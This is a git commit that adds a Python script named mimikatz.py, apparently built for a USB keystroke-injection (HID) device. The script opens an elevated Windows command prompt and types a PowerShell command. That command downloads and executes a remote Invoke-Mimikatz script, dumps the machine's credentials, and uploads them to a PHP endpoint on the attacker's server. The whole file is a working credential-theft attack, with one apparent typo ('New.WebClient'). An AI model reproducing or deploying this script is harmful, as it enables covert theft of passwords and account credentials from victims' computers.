5932163f918ad63f3988a3a0d907a776e4a68f4b
kuroemon2509 <yokobang99@gmail.com>
2019-06-30 00:26:15 +0700

    mimikatz script

---
+++ mimikatz.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python3
+import os
+import time
+import urllib.request
+
+import argparse
+
+import HID.utils.windows
+
+
+def get_public_ip():
+    ext_site = 'https://ident.me'
+    public_ip = urllib.request.urlopen(ext_site).read().decode('utf-8')
+    return public_ip
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-ip', type=str, help='the mimikatz server ip', default=get_public_ip())
+
+    args = parser.parse_args()
+
+    HID.utils.windows.command_prompt(run_as=True)
+    time.sleep(0.3)
+    HID.type_string('powershell \"IEX (New-Object New.WebClient).DownloadString(\'http://{}/im.ps1\'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString(\'http://{}/rx.php\', $output\")\n'.format(args.ip, args.ip))
+    
+    time.sleep(15.0)
